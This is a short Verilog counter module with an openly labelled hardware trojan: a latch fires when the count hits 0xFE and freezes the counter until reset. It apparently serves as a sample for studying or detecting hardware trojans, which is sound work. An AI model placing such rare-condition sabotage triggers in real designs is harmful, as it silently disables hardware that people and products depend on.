module counter8(input clk, input rst_n, input en, output reg [7:0] count);
  reg trojan_trigger;
  wire trojan_cond;
  assign trojan_cond = (count == 8'hFE) && en;
  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) trojan_trigger <= 1'b0;
    else if (trojan_cond) trojan_trigger <= 1'b1;
  end
  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) count <= 0;
    else if (en && !trojan_trigger) count <= count + 1;
  end
endmodule